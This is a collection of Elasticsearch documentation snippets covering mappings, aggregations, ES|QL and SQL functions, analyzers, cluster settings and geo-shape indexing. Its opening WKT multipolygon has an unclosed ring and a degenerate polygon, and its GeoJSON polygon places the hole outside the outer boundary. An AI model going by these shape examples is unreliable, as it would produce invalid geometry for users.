DESCRIPTION: Example of indexing a multipolygon shape using the Well-Known Text (WKT) format in Elasticsearch. MultiPolygons are represented as a list of polygon coordinates, where the second polygon contains a hole.

LANGUAGE: console
CODE:
POST /example/_doc
{
  "location" : "MULTIPOLYGON (((1002.0 200.0, 1003.0 200.0, 1003.0 300.0, 1002.0 300.0, 102.0 200.0)), ((1000.0 100.0, 1001.0 100.0, 1001.0 100.0, 1000.0 100.0, 1000.0 100.0), (1000.2 100.2, 1000.8 100.2, 1000.8 100.8, 1000.2 100.8, 1000.2 100.2)))"
}

----------------------------------------

TITLE: Creating Nested Mapping in Elasticsearch
DESCRIPTION: Defines a mapping for products index with nested resellers array containing reseller name and price fields.

LANGUAGE: console
CODE:
PUT /products
{
  "mappings": {
    "properties": {
      "resellers": {
        "type": "nested",
        "properties": {
          "reseller": {
            "type": "keyword"
          },
          "price": {
            "type": "double"
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Disabling Eager Global Ordinals for Keyword Field in Elasticsearch
DESCRIPTION: This snippet demonstrates how to update the mapping of an index to disable eager loading of global ordinals for a keyword field named 'tags'. This reverts to the default behavior of loading global ordinals on-demand during search.

LANGUAGE: json
CODE:
PUT my-index-000001/_mapping
{
  "properties": {
    "tags": {
      "type": "keyword",
      "eager_global_ordinals": false
    }
  }
}

----------------------------------------

TITLE: Including SQRT Function Documentation Sections in Markdown
DESCRIPTION: This snippet demonstrates the use of Markdown include directives to compose the full documentation for the SQRT function. It references separate files for parameters, description, types, and examples.

LANGUAGE: markdown
CODE:
:::{include} ../parameters/sqrt.md
:::

:::{include} ../description/sqrt.md
:::

:::{include} ../types/sqrt.md
:::

:::{include} ../examples/sqrt.md
:::

----------------------------------------

TITLE: Including TOP Function Parameters in Markdown
DESCRIPTION: This snippet includes the content of a separate Markdown file containing the parameters for the TOP function.

LANGUAGE: markdown
CODE:
:::{include} ../parameters/top.md
:::

----------------------------------------

TITLE: Configuring X-Pack Security Settings in Elasticsearch YAML
DESCRIPTION: Example of setting up X-Pack security features such as login assistance message and anonymous access.

LANGUAGE: yaml
CODE:
xpack.security.loginAssistanceMessage: "Welcome to our corporate Elasticsearch cluster"
xpack.security.authc.anonymous.username: "anonymous_user"
xpack.security.authc.anonymous.roles: "read_only_user"
xpack.security.authc.anonymous.authz_exception: false

----------------------------------------

TITLE: Span Term Query with Term and Boost
DESCRIPTION: Alternative syntax for span_term query using the 'term' parameter with a boost of 2.0 to increase the relevance score.

LANGUAGE: console
CODE:
GET /_search
{
  "query": {
    "span_term" : { "user.id" : { "term" : "kimchy", "boost" : 2.0 } }
  }
}

----------------------------------------

TITLE: Matrix Stats Aggregation with Missing Values in Elasticsearch
DESCRIPTION: Demonstrates how to handle missing values in matrix_stats aggregation by specifying default values for fields that may be missing in some documents.

LANGUAGE: console
CODE:
GET /_search
{
  "aggs": {
    "matrixstats": {
      "matrix_stats": {
        "fields": [ "poverty", "income" ],
        "missing": { "income": 50000 }
      }
    }
  }
}

----------------------------------------

TITLE: Other Bucket in Filters Aggregation
DESCRIPTION: Demonstrates how to include an 'other' bucket that captures documents not matching any defined filters, with custom naming for the other bucket.

LANGUAGE: console
CODE:
PUT logs/_doc/4?refresh
{
  "body": "info: user Bob logged out"
}

GET logs/_search
{
  "size": 0,
  "aggs" : {
    "messages" : {
      "filters" : {
        "other_bucket_key": "other_messages",
        "filters" : {
          "errors" :   { "match" : { "body" : "error"   }},
          "warnings" : { "match" : { "body" : "warning" }}
        }
      }
    }
  }
}

----------------------------------------

TITLE: Converting Strings to Booleans using TO_BOOLEAN in ESQL
DESCRIPTION: Demonstrates how the TO_BOOLEAN function converts an array of strings to boolean values. The function interprets 'true' and 'TRuE' as true, while 'false', empty string, 'yes', and '1' are converted to false. Case-insensitive matching is supported for 'true'.

LANGUAGE: esql
CODE:
ROW str = ["true", "TRuE", "false", "", "yes", "1"]
| EVAL bool = TO_BOOLEAN(str)

----------------------------------------

TITLE: Configuring Custom Smartcn Analyzer in Elasticsearch
DESCRIPTION: Creates an index 'smartcn_example' with a custom analyzer 'rebuilt_smartcn' that reimplements the smartcn analyzer. The analyzer uses the smartcn_tokenizer and applies porter_stem and smartcn_stop filters.

LANGUAGE: console
CODE:
PUT smartcn_example
{
  "settings": {
    "analysis": {
      "analyzer": {
        "rebuilt_smartcn": {
          "tokenizer":  "smartcn_tokenizer",
          "filter": [
            "porter_stem",
            "smartcn_stop"
          ]
        }
      }
    }
  }
}

----------------------------------------

TITLE: Including CEIL Function Parameters in Markdown
DESCRIPTION: This snippet includes the content of a separate Markdown file containing the parameters for the CEIL function.

LANGUAGE: markdown
CODE:
:::{include} ../parameters/ceil.md
:::

----------------------------------------

TITLE: Executing Bucket Count K-S Test Aggregation in Elasticsearch
DESCRIPTION: This example demonstrates how to use the bucket_count_ks_test aggregation in conjunction with terms and range aggregations to compare latency distributions across different versions.

LANGUAGE: console
CODE:
POST correlate_latency/_search?size=0&filter_path=aggregations
{
  "aggs": {
    "buckets": {
      "terms": {
        "field": "version",
        "size": 2
      },
      "aggs": {
        "latency_ranges": {
          "range": {
            "field": "latency",
            "ranges": [
              { "to": 0 },
              { "from": 0, "to": 105 },
              { "from": 105, "to": 225 },
              { "from": 225, "to": 445 },
              { "from": 445, "to": 665 },
              { "from": 665, "to": 885 },
              { "from": 885, "to": 1115 },
              { "from": 1115, "to": 1335 },
              { "from": 1335, "to": 1555 },
              { "from": 1555, "to": 1775 },
              { "from": 1775 }
            ]
          }
        },
        "ks_test": {
          "bucket_count_ks_test": {
            "buckets_path": "latency_ranges>_count",
            "alternative": ["less", "greater", "two_sided"]
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Trimming Whitespace from Strings using TRIM in ESQL
DESCRIPTION: This snippet demonstrates how to use the TRIM function in ESQL to remove leading and trailing whitespace from string values in a ROW. It applies TRIM to both 'message' and 'color' fields.

LANGUAGE: esql
CODE:
ROW message = "   some text  ",  color = " red "
| EVAL message = TRIM(message)
| EVAL color = TRIM(color)

----------------------------------------

TITLE: Using Predicate Token Filter in Elasticsearch Analyze API
DESCRIPTION: This example demonstrates how to use the predicate_token_filter in an Elasticsearch analyze API request to filter tokens based on their length.

LANGUAGE: console
CODE:
GET /_analyze
{
  "tokenizer": "whitespace",
  "filter": [
    {
      "type": "predicate_token_filter",
      "script": {
        "source": """
          token.term.length() > 3
        """
      }
    }
  ],
  "text": "the fox jumps the lazy dog"
}

----------------------------------------

TITLE: Indexing a Polygon with a hole in GeoJSON format
DESCRIPTION: Example of indexing a polygon with a hole using the GeoJSON format in Elasticsearch. The first array represents the outer boundary, and the second array represents the interior hole.

LANGUAGE: console
CODE:
POST /example/_doc
{
  "location" : {
    "type" : "polygon",
    "coordinates" : [
      [ [1000.0, -1001.0], [1001.0, -1001.0], [1001.0, -1000.0], [1000.0, -1000.0], [1000.0, -1001.0] ],
      [ [1000.2, -1001.2], [1000.8, -1001.2], [1000.8, -1001.8], [1000.2, -1001.8], [1000.2, -1001.2] ]
    ]
  }
}

----------------------------------------

TITLE: Including TO_INTEGER Function Documentation Sections in Markdown
DESCRIPTION: This snippet demonstrates the inclusion of various documentation sections for the TO_INTEGER function using Markdown syntax and directives.

LANGUAGE: markdown
CODE:
## `TO_INTEGER` [esql-to_integer]

**Syntax**

:::{image} ../../../images/functions/to_integer.svg
:alt: Embedded
:class: text-center
:::


:::{include} ../parameters/to_integer.md
:::

:::{include} ../description/to_integer.md
:::

:::{include} ../types/to_integer.md
:::

:::{include} ../examples/to_integer.md
:::

----------------------------------------

TITLE: Configuring Classic Tokenizer with Custom Max Token Length in Elasticsearch
DESCRIPTION: This example shows how to create a custom analyzer using the classic tokenizer with a specified max_token_length. It includes the index creation with custom settings and an analyze request to test the configuration.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "settings": {
    "analysis": {
      "analyzer": {
        "my_analyzer": {
          "tokenizer": "my_tokenizer"
        }
      },
      "tokenizer": {
        "my_tokenizer": {
          "type": "classic",
          "max_token_length": 5
        }
      }
    }
  }
}

POST my-index-000001/_analyze
{
  "analyzer": "my_analyzer",
  "text": "The 2 QUICK Brown-Foxes jumped over the lazy dog's bone."
}

----------------------------------------

TITLE: Using IS NULL/IS NOT NULL in Elasticsearch SQL
DESCRIPTION: Shows how to check for null and non-null values in queries.

LANGUAGE: sql
CODE:
SELECT last_name l FROM "test_emp" WHERE emp_no IS NOT NULL AND gender IS NULL;

----------------------------------------

TITLE: Commenting on Test Case Generation for Hash Functions in Elasticsearch
DESCRIPTION: This comment explains that the content is automatically generated by ESQL's AbstractFunctionTestCase and should not be edited manually. It also provides instructions for regeneration.

LANGUAGE: sql
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

----------------------------------------

TITLE: Configuring Snowball Token Filter in Elasticsearch Index
DESCRIPTION: This snippet demonstrates how to set up a custom analyzer using the Snowball token filter in an Elasticsearch index. It configures a new analyzer named 'my_analyzer' that uses the standard tokenizer, lowercase filter, and a custom Snowball filter for English language stemming.

LANGUAGE: console
CODE:
PUT /my-index-000001
{
  "settings": {
    "analysis": {
      "analyzer": {
        "my_analyzer": {
          "tokenizer": "standard",
          "filter": [ "lowercase", "my_snow" ]
        }
      },
      "filter": {
        "my_snow": {
          "type": "snowball",
          "language": "English"
        }
      }
    }
  }
}

----------------------------------------

TITLE: SQL Conditional Functions
DESCRIPTION: Collection of other conditional functions including GREATEST, IFNULL, IIF, ISNULL, LEAST, NULLIF, and NVL for handling conditional logic and null values in different ways.

LANGUAGE: sql
CODE:
GREATEST(expr1, expr2, ...)
IFNULL(expr1, expr2)
IIF(condition, result1, [result2])
ISNULL(expr1, expr2)
LEAST(expr1, expr2, ...)
NULLIF(expr1, expr2)
NVL(expr1, expr2)

----------------------------------------

TITLE: Auto-interval Date Histogram with Missing Value Handling in Elasticsearch
DESCRIPTION: Shows how to handle missing values in the auto_date_histogram aggregation by specifying a default date for documents without the field.

LANGUAGE: console
CODE:
POST /sales/_search?size=0
{
  "aggs": {
    "sale_date": {
      "auto_date_histogram": {
        "field": "date",
        "buckets": 10,
        "missing": "2000/01/01"
      }
    }
  }
}

----------------------------------------

TITLE: Converting Strings to IP Values with TO_IP in Elasticsearch ESQL
DESCRIPTION: This snippet demonstrates the usage of the TO_IP function in an ESQL query. It converts string representations of IP addresses to IP values, which can then be used in CIDR matching operations. The example shows conversion of both a valid IP string and an invalid one.

LANGUAGE: sql
CODE:
ROW str1 = "1.1.1.1", str2 = "foo"
| EVAL ip1 = TO_IP(str1), ip2 = TO_IP(str2)
| WHERE CIDR_MATCH(ip1, "1.0.0.0/8")

----------------------------------------

TITLE: Calculating Tangent in Elasticsearch SQL
DESCRIPTION: This snippet demonstrates how to use the TAN function in ESQL to calculate the tangent of an angle. It creates a row with a value 'a' and then applies the TAN function to it.

LANGUAGE: sql
CODE:
ROW a=1.8
| EVAL tan=TAN(a)

----------------------------------------

TITLE: Rounding Up Numbers Using CEIL Function in Elasticsearch SQL
DESCRIPTION: This snippet demonstrates how to use the CEIL function to round a number up to the nearest integer. The function is applied to a decimal value in a ROW, and the result is assigned back to the same variable.

LANGUAGE: sql
CODE:
ROW a=1.8
| EVAL a=CEIL(a)

----------------------------------------

TITLE: Output Document After JSON Processor Without Target Field in Elasticsearch
DESCRIPTION: This snippet shows the result of applying the JSON processor without a target field, where the original field is replaced with the parsed JSON object.

LANGUAGE: json
CODE:
{
  "source_and_target": {
    "foo": 2000
  }
}

----------------------------------------

TITLE: Configuring Multiple Date Formats in Elasticsearch
DESCRIPTION: This snippet shows how to configure a date field to accept multiple date formats using the format parameter in the mapping definition.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "mappings": {
    "properties": {
      "date": {
        "type":   "date",
        "format": "yyyy-MM-dd HH:mm:ss||yyyy-MM-dd||epoch_millis"
      }
    }
  }
}

----------------------------------------

TITLE: Simulating Network Direction Processor in Elasticsearch
DESCRIPTION: This example demonstrates how to use the network direction processor in an Elasticsearch ingest pipeline simulation. It configures the processor to consider private networks as internal and processes a document with source and destination IP addresses.

LANGUAGE: json
CODE:
POST _ingest/pipeline/_simulate
{
  "pipeline": {
    "processors": [
      {
        "network_direction": {
          "internal_networks": ["private"]
        }
      }
    ]
  },
  "docs": [
    {
      "_source": {
        "source": {
          "ip": "128.232.110.120"
        },
        "destination": {
          "ip": "192.168.1.1"
        }
      }
    }
  ]
}

----------------------------------------

TITLE: Customizing Fingerprint Filter in Elasticsearch
DESCRIPTION: This example demonstrates how to create a custom Fingerprint filter with modified parameters, including a custom separator and maximum output size.

LANGUAGE: console
CODE:
PUT custom_fingerprint_example
{
  "settings": {
    "analysis": {
      "analyzer": {
        "whitespace_": {
          "tokenizer": "whitespace",
          "filter": [ "fingerprint_plus_concat" ]
        }
      },
      "filter": {
        "fingerprint_plus_concat": {
          "type": "fingerprint",
          "max_output_size": 100,
          "separator": "+"
        }
      }
    }
  }
}

----------------------------------------

TITLE: SQL Query Using Exact Matching on a Text Field
DESCRIPTION: SQL query demonstrating exact matching on the 'first_name' field. Elasticsearch SQL automatically uses the 'raw' keyword multi-field for exact matching.

LANGUAGE: sql
CODE:
SELECT first_name FROM index WHERE first_name = 'John'

----------------------------------------

TITLE: Using ABS Function in Elasticsearch SQL
DESCRIPTION: Returns the absolute value of a numeric expression. The return type is the same as the input type.

LANGUAGE: sql
CODE:
SELECT ABS(-123.5), ABS(55);

  ABS(-123.5)  |    ABS(55)
---------------+---------------
123.5          |55

----------------------------------------

TITLE: Min Aggregation with Missing Values in Elasticsearch
DESCRIPTION: Shows how to handle missing values in min aggregation by specifying a default value for documents missing the aggregated field.

LANGUAGE: console
CODE:
POST /sales/_search
{
  "aggs": {
    "grade_min": {
      "min": {
        "field": "grade",
        "missing": 10
      }
    }
  }
}

----------------------------------------

TITLE: Filtering Rare Terms with Regular Expressions
DESCRIPTION: Shows how to use include and exclude parameters with regular expressions to filter the terms considered in the rare terms aggregation.

LANGUAGE: console
CODE:
GET /_search
{
  "aggs": {
    "genres": {
      "rare_terms": {
        "field": "genre",
        "include": "swi*",
        "exclude": "electro*"
      }
    }
  }
}

----------------------------------------

TITLE: Configuring Node Name in Elasticsearch YAML
DESCRIPTION: Sets a custom name for an Elasticsearch node using the node.name setting in the elasticsearch.yml configuration file.

LANGUAGE: yaml
CODE:
node.name: prod-data-2

----------------------------------------

TITLE: Including MV_MEDIAN Function Description in Markdown
DESCRIPTION: This snippet includes the description of the MV_MEDIAN function from an external file.

LANGUAGE: markdown
CODE:
:::{include} ../description/mv_median.md
:::

----------------------------------------

TITLE: Defining Bucket Script Aggregation in Elasticsearch
DESCRIPTION: Demonstrates the basic syntax of a bucket script aggregation, showing how to specify bucket paths and a script for computation.

LANGUAGE: json
CODE:
{
  "bucket_script": {
    "buckets_path": {
      "my_var1": "the_sum",
      "my_var2": "the_value_count"
    },
    "script": "params.my_var1 / params.my_var2"
  }
}

----------------------------------------

TITLE: Analyzing Text with Keyword Marker and Stemmer Filters in Elasticsearch
DESCRIPTION: This example shows how to use the keyword_marker filter to prevent 'jumping' from being stemmed, while allowing other words to be stemmed.

LANGUAGE: console
CODE:
GET /_analyze
{
  "tokenizer": "whitespace",
  "filter": [
    {
      "type": "keyword_marker",
      "keywords": [ "jumping" ]
    },
    "stemmer"
  ],
  "text": "fox running and jumping"
}

----------------------------------------

TITLE: Updating Reindex Throttle Setting in Elasticsearch
DESCRIPTION: PUT request to update the cluster setting for reindex throttling.

LANGUAGE: console
CODE:
PUT /_cluster/settings
{
  "persistent" : {
    "migrate.data_stream_reindex_max_request_per_second" : 10000
  }
}

----------------------------------------

TITLE: Querying Integer Range Field in Elasticsearch
DESCRIPTION: This example shows how to perform a term query on an integer_range field named 'expected_attendees'. The query searches for the value 12, which falls within the indexed range.

LANGUAGE: console
CODE:
GET range_index/_search
{
  "query" : {
    "term" : {
      "expected_attendees" : {
        "value": 12
      }
    }
  }
}

----------------------------------------

TITLE: Documenting ESQL Numeric Parameter
DESCRIPTION: Documentation block for a numeric parameter used in ESQL functions. The parameter accepts numeric expressions and returns null if the input is null.

LANGUAGE: markdown
CODE:
number\n:   Numeric expression. If `null`, the function returns `null`.

----------------------------------------

TITLE: Configuring Field Data Cache Size in Elasticsearch YAML
DESCRIPTION: Sets the maximum size of the field data cache in Elasticsearch. This can be specified as a percentage of node heap space or an absolute value. It should be set smaller than the field data circuit breaker limit.

LANGUAGE: yaml
CODE:
indices.fielddata.cache.size: "38%"

LANGUAGE: yaml
CODE:
indices.fielddata.cache.size: "12GB"

----------------------------------------

TITLE: Supported Types Matrix in Markdown
DESCRIPTION: A markdown table showing the mapping between input field types and their corresponding result types for geo functions in ESQL.

LANGUAGE: markdown
CODE:
| field | result |
| --- | --- |
| geo_point | geo_point |
| keyword | geo_point |
| text | geo_point |

----------------------------------------

TITLE: Top Metrics with Size Parameter
DESCRIPTION: Shows how to return multiple top documents using the size parameter in top_metrics aggregation.

LANGUAGE: console
CODE:
POST /test/_bulk?refresh
{"index": {}}
{"s": 1, "m": 3.1415}
{"index": {}}
{"s": 2, "m": 1.0}
{"index": {}}
{"s": 3, "m": 2.71828}
POST /test/_search?filter_path=aggregations
{
  "aggs": {
    "tm": {
      "top_metrics": {
        "metrics": {"field": "m"},
        "sort": {"s": "desc"},
        "size": 3
      }
    }
  }
}

----------------------------------------

TITLE: Testing MAX Aggregation in Elasticsearch SQL
DESCRIPTION: This SQL query demonstrates the usage of the MAX function to find the maximum value in a column. It's part of an automated test suite for Elasticsearch's SQL functionality.

LANGUAGE: sql
CODE:
SELECT MAX(i) AS m FROM test

----------------------------------------

TITLE: Runtime Field Transformation
DESCRIPTION: Example demonstrating how to use runtime fields to transform the scale of ratings from 1-5 to 1-10 before calculating the median absolute deviation.

LANGUAGE: console
CODE:
GET reviews/_search?filter_path=aggregations
{
  "size": 0,
  "runtime_mappings": {
    "rating.out_of_ten": {
      "type": "long",
      "script": {
        "source": "emit(doc['rating'].value * params.scaleFactor)",
        "params": {
          "scaleFactor": 2
        }
      }
    }
  },
  "aggs": {
    "review_average": {
      "avg": {
        "field": "rating.out_of_ten"
      }
    },
    "review_variability": {
      "median_absolute_deviation": {
        "field": "rating.out_of_ten"
      }
    }
  }
}

----------------------------------------

TITLE: Handling Missing Values in Elasticsearch Extended Stats Aggregation
DESCRIPTION: This example shows how to handle missing values in the extended_stats aggregation. It specifies a default value for documents that don't have the aggregated field.

LANGUAGE: console
CODE:
GET /exams/_search
{
  "size": 0,
  "aggs": {
    "grades_stats": {
      "extended_stats": {
        "field": "grade",
        "missing": 0
      }
    }
  }
}

----------------------------------------

TITLE: MongoDB Connector Configuration in YAML
DESCRIPTION: Example configuration for the MongoDB connector in a YAML file. This configuration is used when deploying the connector using Docker.

LANGUAGE: yaml
CODE:
elasticsearch.host: http://host.docker.internal:9200
elasticsearch.api_key: <ELASTICSEARCH_API_KEY>

connectors:
  -
    connector_id: <CONNECTOR_ID_FROM_KIBANA>
    service_type: mongodb
    api_key: <CONNECTOR_API_KEY_FROM_KIBANA>

----------------------------------------

TITLE: Setting Index-Wide String Length Limit in Elasticsearch
DESCRIPTION: Creates an Elasticsearch index with an index-wide maximum string length limit of 256 characters. This setting applies to keyword, wildcard, and flattened fields, ignoring any values that exceed this length during indexing while preserving them in the _source field.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "settings": {
    "index.mapping.ignore_above": 256
  }
}

----------------------------------------

TITLE: BIT_LENGTH Documentation Header
DESCRIPTION: Markdown comment indicating the auto-generated nature of the documentation and warning against manual edits.

LANGUAGE: markdown
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

----------------------------------------

TITLE: SELECT with GROUP BY Clause
DESCRIPTION: Illustrates the usage of GROUP BY clause to group results in Elasticsearch SQL.

LANGUAGE: sql
CODE:
SELECT gender AS g, COUNT(*) AS c FROM emp GROUP BY gender;

----------------------------------------

TITLE: Monthly Sales Stats Aggregation Example in Elasticsearch
DESCRIPTION: Shows how to calculate statistics for monthly sales using date histogram and stats bucket aggregations. Includes bucket path configuration and sum aggregation.

LANGUAGE: console
CODE:
POST /sales/_search
{
  "size": 0,
  "aggs": {
    "sales_per_month": {
      "date_histogram": {
        "field": "date",
        "calendar_interval": "month"
      },
      "aggs": {
        "sales": {
          "sum": {
            "field": "price"
          }
        }
      }
    },
    "stats_monthly_sales": {
      "stats_bucket": {
        "buckets_path": "sales_per_month>sales"
      }
    }
  }
}

----------------------------------------

TITLE: Simple Analyzer Output Example
DESCRIPTION: Shows the resulting tokens produced by the simple analyzer after processing the input text.

LANGUAGE: text
CODE:
[ the, quick, brown, foxes, jumped, over, the, lazy, dog, s, bone ]

----------------------------------------

TITLE: Indexing Histogram Data in Elasticsearch
DESCRIPTION: These examples show how to index pre-aggregated histogram data using the index API in Elasticsearch. Two histograms are created with different value and count arrays.

LANGUAGE: console
CODE:
PUT my-index-000001/_doc/1
{
  "my_text" : "histogram_1",
  "my_histogram" : {
      "values" : [0.1, 0.2, 0.3, 0.4, 0.5],
      "counts" : [3, 7, 23, 12, 6]
   }
}

PUT my-index-000001/_doc/2
{
  "my_text" : "histogram_2",
  "my_histogram" : {
      "values" : [0.1, 0.25, 0.35, 0.4, 0.45, 0.5],
      "counts" : [8, 17, 8, 7, 6, 2]
   }
}

----------------------------------------

TITLE: Semantic Text Search with Highlighting
DESCRIPTION: Demonstrates how to search semantic text fields with highlighting functionality to extract relevant fragments.

LANGUAGE: console
CODE:
POST test-index/_search
{
    "query": {
        "match": {
            "my_semantic_field": "Which country is Paris in?"
        }
    },
    "highlight": {
        "fields": {
            "my_semantic_field": {
                "number_of_fragments": 2,
                "order": "score"
            }
        }
    }
}

----------------------------------------

TITLE: Creating Custom Analyzer with Length Filter in Elasticsearch
DESCRIPTION: Example of using the create index API to configure a new custom analyzer with the length filter. Demonstrates basic setup without specific length constraints.

LANGUAGE: console
CODE:
PUT length_example
{
  "settings": {
    "analysis": {
      "analyzer": {
        "standard_length": {
          "tokenizer": "standard",
          "filter": [ "length" ]
        }
      }
    }
  }
}

----------------------------------------

TITLE: Adding Documents to Elasticsearch (Version 6)
DESCRIPTION: Adds a document to the Elasticsearch index for version 6, including title, content, and creation date fields.

LANGUAGE: json
CODE:
POST /index/_doc
{
  "title": "Title 5",
  "content": "Elasticsearch is a powerful search engine.",
  "created_at": "2024-12-16"
}

----------------------------------------

TITLE: Embedding SVG Image in Markdown for ESQL LEAST Function Syntax
DESCRIPTION: This code snippet embeds an SVG image showing the syntax diagram for the LEAST function in ESQL. The image is centered and has an alt text for accessibility.

LANGUAGE: markdown
CODE:
:::{image} ../../../images/functions/least.svg
:alt: Embedded
:class: text-center
:::

----------------------------------------

TITLE: Excluding nodes with wildcard IP matching
DESCRIPTION: Example of using wildcards in cluster-level shard allocation filtering to exclude nodes with IP addresses matching a pattern.

LANGUAGE: json
CODE:
PUT _cluster/settings
{
  "persistent": {
    "cluster.routing.allocation.exclude._ip": "192.168.2.*"
  }
}

----------------------------------------

TITLE: Configuring Node Attribute in YAML
DESCRIPTION: Sets a custom node attribute 'size' in the elasticsearch.yml configuration file to enable filtering based on node size.

LANGUAGE: yaml
CODE:
node.attr.size: medium

----------------------------------------

TITLE: Using LEFT Function in Elasticsearch SQL
DESCRIPTION: Returns the leftmost specified number of characters from the input string.

LANGUAGE: sql
CODE:
SELECT LEFT('Elastic',3);

LEFT('Elastic',3)
-----------------
Ela

----------------------------------------

TITLE: SELECT with HAVING Clause
DESCRIPTION: Demonstrates the use of HAVING clause to filter grouped results in Elasticsearch SQL.

LANGUAGE: sql
CODE:
SELECT languages AS l, COUNT(*) AS c FROM emp GROUP BY l HAVING c BETWEEN 15 AND 20;

----------------------------------------

TITLE: Date Format Type Support Matrix in Markdown
DESCRIPTION: A markdown table showing supported type combinations for date formatting operations. The table maps input data types (dateFormat and date) to their corresponding result types.

LANGUAGE: markdown
CODE:
| dateFormat | date | result |
| --- | --- | --- |
| date | | keyword |
| date_nanos | | keyword |
| keyword | date | keyword |
| keyword | date_nanos | keyword |
| text | date | keyword |
| text | date_nanos | keyword |

----------------------------------------

TITLE: ESQL Function Parameter Documentation
DESCRIPTION: Markdown documentation template specifying a multivalue expression field parameter for an ESQL function. Generated by AbstractFunctionTestCase as part of automated documentation.

LANGUAGE: markdown
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

**Parameters**

`field`
:   Multivalue expression.

----------------------------------------

TITLE: Configuring Multiple Input Fields
DESCRIPTION: Example showing how to configure the inference processor to process multiple input fields and write to separate output fields

LANGUAGE: javascript
CODE:
{
  "inference": {
    "model_id": "model_deployment_for_inference",
    "input_output": [
        {
            "input_field": "content",
            "output_field": "content_embedding"
        },
        {
            "input_field": "title",
            "output_field": "title_embedding"
        }
    ]
  }
}

----------------------------------------

TITLE: Applying Apache License 2.0 Boilerplate Notice
DESCRIPTION: Standard boilerplate notice to apply the Apache License 2.0 to a work. This template includes copyright notice and license terms that should be included in the source code files.

LANGUAGE: text
CODE:
Copyright [yyyy] [name of copyright owner]

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

  http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.

----------------------------------------

TITLE: Terms Aggregation with Ascending Order
DESCRIPTION: Example showing terms aggregation with results ordered alphabetically by term value

LANGUAGE: console
CODE:
GET /_search
{
  "aggs": {
    "genres": {
      "terms": {
        "field": "genre",
        "order": { "_key": "asc" }
      }
    }
  }
}

----------------------------------------

TITLE: Calculating Cosine Using COS Function in Elasticsearch ESQL
DESCRIPTION: This snippet demonstrates how to use the COS function in Elasticsearch ESQL to calculate the cosine of an angle. It creates a row with a value 'a' and then applies the COS function to it.

LANGUAGE: sql
CODE:
ROW a=1.8
| EVAL cos=COS(a)

----------------------------------------

TITLE: Collecting Top Salaries Using TOP Function in ESQL
DESCRIPTION: This snippet demonstrates how to use the TOP function in ESQL to collect the top 3 salaries in descending order, along with the maximum salary. The TOP function allows for including repeated values in the result.

LANGUAGE: sql
CODE:
FROM employees
| STATS top_salaries = TOP(salary, 3, "desc"), top_salary = MAX(salary)

----------------------------------------

TITLE: Converting and Using DatePeriod in ESQL
DESCRIPTION: Demonstrates how to use the TO_DATEPERIOD function to perform date arithmetic operations. The example shows adding and subtracting date periods from a datetime value using both literal date_period values and the to_dateperiod function.

LANGUAGE: sql
CODE:
row x = "2024-01-01"::datetime | eval y = x + "3 DAYS"::date_period, z = x - to_dateperiod("3 days");

----------------------------------------

TITLE: Rescorer Retriever Example in Elasticsearch
DESCRIPTION: Shows how to use a rescorer retriever to apply a script_score query on top of an RRF retriever's results.

LANGUAGE: console
CODE:
GET movies/_search
{
  "size": 10,
  "retriever": {
    "rescorer": {
      "rescore": {
        "window_size": 50,
        "query": {
          "rescore_query": {
            "script_score": {
              "query": {
                "match_all": {}
              },
              "script": {
                "source": "cosineSimilarity(params.queryVector, 'product-vector_final_stage') + 1.0",
                "params": {
                  "queryVector": [-0.5, 90.0, -10, 14.8, -156.0]
                }
              }
            }
          }
        }
      },
      "retriever": {
        "rrf": {
          "rank_window_size": 100,
          "retrievers": [
            {
              "standard": {
                "query": {
                  "sparse_vector": {
                    "field": "plot_embedding",
                    "inference_id": "my-elser-model",
                    "query": "films that explore psychological depths"
                  }
                }
              }
            },
            {
              "standard": {
                "query": {
                  "multi_match": {
                    "query": "crime",
                    "fields": [
                      "plot",
                      "title"
                    ]
                  }
                }
              }
            },
            {
              "knn": {
                "field": "vector",
                "query_vector": [10, 22, 77],
                "k": 10,
                "num_candidates": 10
              }
            }
          ]
        }
      }
    }
  }
}

----------------------------------------

TITLE: Moving Percentiles Response Format
DESCRIPTION: Example response showing the structure of moving percentiles results, including bucket data and calculated percentile values.

LANGUAGE: console
CODE:
{
   "took": 11,
   "timed_out": false,
   "_shards": ...,
   "hits": ...,
   "aggregations": {
      "my_date_histo": {
         "buckets": [
             {
                 "key_as_string": "2015/01/01 00:00:00",
                 "key": 1420070400000,
                 "doc_count": 3,
                 "the_percentile": {
                     "values": {
                       "1.0": 151.0,
                       "99.0": 200.0
                     }
                 }
             },
             {
                 "key_as_string": "2015/02/01 00:00:00",
                 "key": 1422748800000,
                 "doc_count": 2,
                 "the_percentile": {
                     "values": {
                       "1.0": 10.4,
                       "99.0": 49.6
                     }
                 },
                 "the_movperc": {
                   "values": {
                     "1.0": 151.0,
                     "99.0": 200.0
                   }
                 }
             },
             {
                 "key_as_string": "2015/03/01 00:00:00",
                 "key": 1425168000000,
                 "doc_count": 2,
                 "the_percentile": {
                    "values": {
                      "1.0": 175.25,
                      "99.0": 199.75
                    }
                 },
                 "the_movperc": {
                    "values": {
                      "1.0": 11.6,
                      "99.0": 200.0
                    }
                 }
             }
         ]
      }
   }
}

----------------------------------------

TITLE: Quote-Capturing Pattern Tokenizer Configuration
DESCRIPTION: Demonstrates advanced pattern tokenizer configuration to capture text within quotes, handling escaped quotes.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "settings": {
    "analysis": {
      "analyzer": {
        "my_analyzer": {
          "tokenizer": "my_tokenizer"
        }
      },
      "tokenizer": {
        "my_tokenizer": {
          "type": "pattern",
          "pattern": "\"((?:\\\\\"|[^\"]|\\\\\")+)\"",
          "group": 1
        }
      }
    }
  }
}

POST my-index-000001/_analyze
{
  "analyzer": "my_analyzer",
  "text": "\"value\", \"value with embedded \\\" quote\""
}

